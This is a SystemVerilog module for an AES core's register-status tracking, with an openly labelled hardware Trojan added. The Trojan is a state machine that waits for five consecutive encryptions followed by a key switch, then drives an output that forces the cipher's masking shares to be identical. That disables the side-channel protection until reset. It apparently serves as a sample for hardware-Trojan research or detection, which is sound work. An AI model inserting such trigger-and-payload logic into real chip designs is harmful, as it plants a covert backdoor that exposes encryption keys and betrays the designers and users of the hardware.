module aes_reg_status #(
  parameter int Width = 1
) (
  input  logic             clk_i,
  input  logic             rst_ni,

  input  logic [Width-1:0] we_i,
  input  logic             use_i,
  input  logic             clear_i,
  input  logic             arm_i,
  output logic             new_o,
  output logic             new_pulse_o,
  output logic             clean_o,

  // === TROJAN MOD: Signals required to implement and activate the Trojan ===
  input  logic             enc_start_i,       // signal: encryption operation starting
  input  logic             key_switch_i,      // signal: encryption key switch command (SW-driven)
  input  logic             reset_event_i,     // signal: system reset or soft reset indicator
  output logic             trojan_force_share // signal: force internal shares identical (payload)
);

  logic [Width-1:0] we_d, we_q;
  logic             armed_d, armed_q;
  logic             all_written;
  logic             none_written;
  logic             new_d, new_q;
  logic             clean_d, clean_q;

  // ========================================================================
  // === TROJAN MOD: Trojan state and trigger logic ===
  // ========================================================================

  typedef enum logic [1:0] {
    TROJAN_IDLE    = 2'b00,
    TROJAN_ACTIVE  = 2'b01,
    TROJAN_WAIT_KEY= 2'b10,
    TROJAN_PAYOUT  = 2'b11
  } trojan_state_e;

  logic [2:0] trojan_enc_cnt_q, trojan_enc_cnt_d; // counts consecutive encryptions (max 5)
  trojan_state_e trojan_state_q, trojan_state_d;

  // Trojan -- next-state logic
  always_comb begin
    trojan_enc_cnt_d = trojan_enc_cnt_q;
    trojan_state_d = trojan_state_q;

    case (trojan_state_q)
      TROJAN_IDLE: begin
        if (enc_start_i) begin
          trojan_enc_cnt_d = 3'd1;
          trojan_state_d   = TROJAN_ACTIVE;
        end else begin
          trojan_enc_cnt_d = 3'd0;
          trojan_state_d   = TROJAN_IDLE;
        end
      end

      TROJAN_ACTIVE: begin
        if (enc_start_i) begin
          if (trojan_enc_cnt_q == 3'd4) begin
            trojan_enc_cnt_d = 3'd5;
            trojan_state_d   = TROJAN_WAIT_KEY;
          end else begin
            trojan_enc_cnt_d = trojan_enc_cnt_q + 3'd1;
            trojan_state_d   = TROJAN_ACTIVE;
          end
        end else if (reset_event_i || clear_i) begin
          // Reset interrupts the sequence
          trojan_enc_cnt_d = 3'd0;
          trojan_state_d   = TROJAN_IDLE;
        end
      end

      TROJAN_WAIT_KEY: begin
        if (key_switch_i) begin
          trojan_state_d   = TROJAN_PAYOUT; // Payload becomes active, next cycle
        end else if (enc_start_i) begin
          // Any further operation invalidates sequence -- must be key_switch only
          trojan_state_d   = TROJAN_IDLE;
          trojan_enc_cnt_d = 3'd0;
        end else if (reset_event_i || clear_i) begin
          trojan_state_d   = TROJAN_IDLE;
          trojan_enc_cnt_d = 3'd0;
        end
      end

      TROJAN_PAYOUT: begin
        // Payload will be active until reset
        if (reset_event_i || clear_i) begin
          trojan_state_d   = TROJAN_IDLE;
          trojan_enc_cnt_d = 3'd0;
        end
      end

      default: begin
        trojan_state_d = TROJAN_IDLE;
        trojan_enc_cnt_d = 3'd0;
      end
    endcase
  end

  // Trojan sequential
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_enc_cnt_q <= 3'd0;
      trojan_state_q   <= TROJAN_IDLE;
    end else begin
      trojan_enc_cnt_q <= trojan_enc_cnt_d;
      trojan_state_q   <= trojan_state_d;
    end
  end

  // Trojan output payload: bind to output for core to use
  assign trojan_force_share = (trojan_state_q == TROJAN_PAYOUT);

  // ========================================================================

  // Collect write operations. Upon clear or use, we start over. If armed, the next write will
  // restart the tracking.
  assign we_d    = (clear_i || use_i) ? '0   :
                   (armed_q && |we_i) ? we_i : (we_q | we_i);
  assign armed_d = (clear_i || use_i) ? 1'b0 :
                   (armed_q && |we_i) ? 1'b0 : armed_q | arm_i;

  always_ff @(posedge clk_i or negedge rst_ni) begin : reg_ops
    if (!rst_ni) begin
      we_q    <= '0;
      armed_q <= 1'b0;
    end else begin
      we_q    <= we_d;
      armed_q <= armed_d;
    end
  end

  // Status tracking
  assign all_written  =  &we_d;
  assign none_written = ~|we_d;

  // We have a complete new value if all registers have been written at least once.
  assign new_d   = (clear_i || use_i) ? 1'b0 : all_written;

  // We have a clean value, if either:
  // - all registers have been written at least once, or
  // - no registers have been written but the value was clean previously.
  // A value is NOT clean, if either:
  // - we get a clear or reset, or
  // - some but not all registers have been written.
  assign clean_d =  clear_i      ? 1'b0    :
                    all_written  ? 1'b1    :
                    none_written ? clean_q : 1'b0;

  always_ff @(posedge clk_i or negedge rst_ni) begin : reg_status
    if (!rst_ni) begin
      new_q   <= 1'b0;
      clean_q <= 1'b0;
    end else begin
      new_q   <= new_d;
      clean_q <= clean_d;
    end
  end

  assign new_o       = new_q;
  assign new_pulse_o = new_d & ~new_q;
  assign clean_o     = clean_q;

endmodule